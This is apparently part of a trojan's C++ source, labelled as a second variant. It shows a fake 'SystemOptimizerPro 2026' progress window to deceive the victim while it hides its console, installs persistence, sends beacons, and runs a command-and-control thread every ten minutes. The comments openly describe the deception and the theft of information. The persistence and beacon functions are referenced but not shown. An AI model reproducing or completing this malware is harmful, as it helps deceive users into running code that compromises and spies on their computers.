// Variant 2 - Fake GUI Optimizer

// '''Philosophy
// Uses Win32 API to create a fake progress window with animated "scanning" bars.
//  Victim watches a believable optimization process. Meanwhile, the Trojan installs persistence, steals basic info, and beacons. Highest psychological deception.'''
#include <windows.h>
#include <string>
#include <thread>

const char* FAKE_STEPS[] = {
    "Scanning for junk files...", "Cleaning registry (42%)...", "Removing temp files...",
    "Optimizing memory allocation...", "Boosting startup speed...", "Optimization complete!"
};

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

void create_fake_gui() {
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "OptimizerClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindow("OptimizerClass", "SystemOptimizerPro 2026", WS_OVERLAPPEDWINDOW,
                             300, 200, 500, 300, NULL, NULL, GetModuleHandle(NULL), NULL);
    ShowWindow(hwnd, SW_SHOW);

    HDC hdc = GetDC(hwnd);
    for (int i = 0; i < 6; ++i) {
        TextOutA(hdc, 50, 80 + i*30, FAKE_STEPS[i], (int)strlen(FAKE_STEPS[i]));
        Sleep(1800);
        // Fake progress bar simulation
        Rectangle(hdc, 50, 150, 400, 170);
        Rectangle(hdc, 52, 152, 50 + (i+1)*55, 168);
    }
    ReleaseDC(hwnd, hdc);
    MessageBoxA(hwnd, "Your system is now 312% faster!", "Success", MB_OK);
    DestroyWindow(hwnd);
}

// Persistence + beacon functions same as Variant 1 (install_persistence, send_beacon)

int WINAPI WinMain(...) {
    hide_console();
    create_fake_gui();
    install_persistence();
    send_beacon();

    std::thread c2([](){ while(true){ send_beacon(); Sleep(600000); }}).detach(); // 10 min
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) DispatchMessage(&msg);
    return 0;
}